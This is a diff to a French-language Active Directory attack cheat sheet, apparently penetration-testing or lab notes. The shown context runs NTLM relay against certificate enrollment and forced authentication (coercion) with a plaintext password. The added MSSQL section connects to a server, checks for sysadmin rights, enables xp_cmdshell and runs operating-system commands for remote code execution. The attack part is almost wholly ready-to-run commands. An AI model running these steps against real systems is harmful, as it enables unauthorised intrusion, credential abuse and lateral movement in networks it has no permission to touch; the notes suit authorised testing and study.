@@ -90,3 +90,18 @@ certipy relay -target http://10.2.62.84/certsrv/certfnsh.asp -template 'DomainCo
 ```bash
 coercer coerce -u 'FEYDRAUTHA.HARKONNEN' -p 'schrauth101' -d imperium.local --target-ip 10.2.62.87 --listener-ip 10.2.62.90  # Force la machine cible à s’authentifier vers ton listener pour capturer une authentification NTLM (coercition)
 ```
+
+## MSSQL
+
+```bash
+mssqlclient.py $DOMAIN/$USER:$PASSWORD@$IP -port 1433 -windows-auth  # Connexion au serveur MSSQL avec auth Windows
+
+# Une fois connecté :
+SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');  -- Vérifier les privilèges
+
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;  -- Activer les options avancées
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;            -- Activer xp_cmdshell
+EXEC xp_cmdshell 'whoami';                                   -- RCE
+
+EXEC xp_cmdshell 'net share';  -- Retrouver le chemin réel des shares SMB sur la machine
+```
